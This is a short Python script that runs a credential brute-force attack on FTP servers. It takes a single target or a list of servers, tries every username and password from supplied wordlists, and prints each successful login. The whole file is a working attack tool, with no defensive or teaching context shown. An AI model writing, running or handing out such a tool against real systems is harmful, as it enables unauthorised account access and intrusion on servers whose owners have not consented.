import argparse
import asyncio
from ftplib import FTP

async def attempt_login(server, username, password):
    try:
        ftp = FTP(server, timeout=10)
        ftp.login(username, password)
        print(f'\033[32mSuccessful login to {server} with {username}:{password}\033[0m')
        ftp.quit()
    except Exception as e:
        print(f'Failed login attempt to {server} with {username}:{password}. {e}')

async def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-s', '--single-server', help='single server to target')
    group.add_argument('-f', '--server-file', help='file containing server addresses')
    parser.add_argument('-u', '--username-file', required=True, help='file containing usernames')
    parser.add_argument('-p', '--password-file', required=True, help='file containing passwords')
    args = parser.parse_args()

    if args.single_server:
        servers = [args.single_server]
    else:
        with open(args.server_file) as f_servers:
            servers = f_servers.read().splitlines()

    with open(args.username_file) as f_usernames:
        usernames = f_usernames.read().splitlines()

    with open(args.password_file) as f_passwords:
        passwords = f_passwords.read().splitlines()

    tasks = []
    for server in servers:
        for username in usernames:
            for password in passwords:
                task = asyncio.create_task(attempt_login(server, username, password))
                tasks.append(task)

    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
